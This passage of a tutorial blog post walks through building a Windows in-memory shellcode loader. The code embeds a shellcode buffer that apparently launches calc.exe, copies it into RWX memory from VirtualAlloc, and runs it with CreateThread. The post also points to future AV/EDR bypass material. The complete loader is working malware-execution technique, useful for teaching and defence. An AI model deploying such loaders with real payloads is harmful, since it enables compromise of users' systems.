@@ -141,3 +141,96 @@ Third we have number of bytes to copy, Since we want to transfer the entire shel
 On successful execution, memcpy returns a pointer to the **destination buffer**, which in this case is `baseaddr`. This should match the same address returned by VirtualAlloc, allowing us to verify that the shellcode was copied to the correct memory location.
 
 ![memcpy result](/assets/images/How-to-run-shellcode-in-memory/memcpy_result.png)
+
+
+## Executing the Shellcode
+
+At this point, everything is properly set up. We have successfully placed our shellcode inside a virtual memory region with executable permissions. The only remaining step is to transfer execution control to this memory location so the CPU can begin executing our payload.
+
+To achieve this, we create a new thread using the Windows API function `CreateThread`.
+
+Creating a thread allows us to specify a starting address for execution, and we simply provide the base address of our shellcode as the thread’s entry point. A thread is basically an independent path of execution within the same program.
+
+```cpp
+HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)baseaddr, NULL, 0, NULL);
+WaitForSingleObject(hThread, INFINITE);
+```
+
+Now lets talk about its arguments:
+- **First argument — Security Attributes**: This parameter allows us to define the security settings for the created object, such as who can access the thread, applying a security descriptor, or whether a child process can inherit the returned handle. By passing `NULL`, we are using the default security attributes provided by Windows. For this basic demonstration, the default behavior is sufficient, so no custom security configuration is required.
+- **Second Argument — Stack Size**: This parameter specifies how much stack memory should be allocated for the thread during execution. The stack is used to store function calls, local variables, and execution data while the thread is running. By passing `0`, we instruct Windows to use the default stack size defined for the application, which is sufficient for most basic use cases and demonstrations.
+- **Third Argument — Start Address**: This argument specifies the starting address of the thread, meaning the function or memory location where execution will begin once the thread is created. In our case, we pass the base address of the allocated memory region `baseaddr` where the shellcode was copied. When the thread starts running, it begins execution from this address, effectively executing the shellcode stored in memory.
+- **Fourth Argument — Thread Parameters**: This argument allows us to pass data or parameters to the thread when it starts executing. Typically, if the thread begins execution at a function that expects input arguments, those values can be supplied through this parameter. Since our shellcode does not require any additional arguments, we simply pass `NULL`, indicating that no parameters are being provided to the thread.
+- **Fifth Argument — Creation Flags**: This parameter controls how the thread is created and how its execution begins. It allows us to specify whether the thread should start running immediately or be created in a suspended state. By passing `0`, we indicate that no special creation flags are being used, which means the thread starts executing immediately after it is created. If we wanted to delay execution, we could use flags such as `CREATE_SUSPENDED` and resume the thread later.
+- **Sixth Argument — Thread Identifier**: This argument expects a pointer to a variable where Windows can store the unique identifier (Thread ID) of the newly created thread. The Thread ID can later be used for thread management operations such as monitoring, synchronization, or debugging. If the Thread ID is not needed, this parameter can be set to `NULL`.
+
+Finally, the `CreateThread` function returns a **HANDLE** to the newly created thread object. A HANDLE is simply a reference provided by Windows that represents a system resource, such as a thread, process, file, or synchronization object. It is not a direct memory pointer, but rather an identifier managed by the operating system that allows a program to safely interact with that resource. When a thread is created, Windows assigns it a unique handle. Using this HANDLE, we can perform various operations on the thread, such as waiting for it to finish execution, modifying its state, or closing the resource once it is no longer needed.
+
+Finally, we use the `WaitForSingleObject` function.
+
+Normally, when a thread is created, it begins executing concurrently with the main program. The main thread continues running the remaining instructions without waiting for the newly created thread to finish. If the main program completes its execution and the process terminates, all threads running under that process are also terminated, since threads always execute within the context of a process.
+
+To prevent the process from exiting before our thread finishes execution, we use the `WaitForSingleObject` function. This function pauses the calling thread and waits for a specified object to reach a signaled state.
+
+The function takes two parameters:
+
+- A handle to the object we want to wait for (in our case, the thread HANDLE returned by `CreateThread`).
+- A timeout value in milliseconds that specifies how long the program should wait.
+
+We can also pass the constant `INFINITE`, which tells Windows to wait indefinitely until the specified object is signaled. For a thread object, this happens when the thread finishes execution.
+
+In our case, we instruct the program to wait indefinitely for the created thread to complete. This ensures that the process remains active until the thread has fully finished executing.
+
+
+## Assembling Everything
+
+So far, we have implemented each component step by step. Now it’s time to bring everything together, compile the code, and run our final program.
+
+```cpp
+#include <iostream>
+#include <Windows.h>
+
+using namespace std;
+
+int main() {
+	unsigned char buf[] =
+		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
+		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
+		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
+	
+	LPVOID baseaddr = VirtualAlloc(NULL, sizeof(buf), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+	void *result= memcpy(baseaddr, buf, sizeof(buf));
+
+	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)baseaddr, NULL, 0, NULL);
+	WaitForSingleObject(hThread, INFINITE);
+
+	return 0;
+}
+```
+For compiling the program, I used **Visual Studio**, but you are free to use any compiler or build method you prefer. After building the solution in **Visual Studio**, the IDE generates the final executable, which can be executed directly.
+
+![exection](/assets/images/How-to-run-shellcode-in-memory/execution.png)
+
+**Note:** When you run this executable, you may see a *Threat Found* notification from Windows Defender. As mentioned earlier, this is a very basic loader created purely for foundational learning and concept demonstration.
+
+In this tutorial, the focus was on understanding how memory allocation, threading, and execution work within the Windows environment, rather than implementing antivirus or EDR evasion techniques. In upcoming blogs, we will further explore detection mechanisms and discuss more advanced concepts related to modern AV/EDR defense Bypass.
+
+![Threat Found](/assets/images/How-to-run-shellcode-in-memory/execution.png)
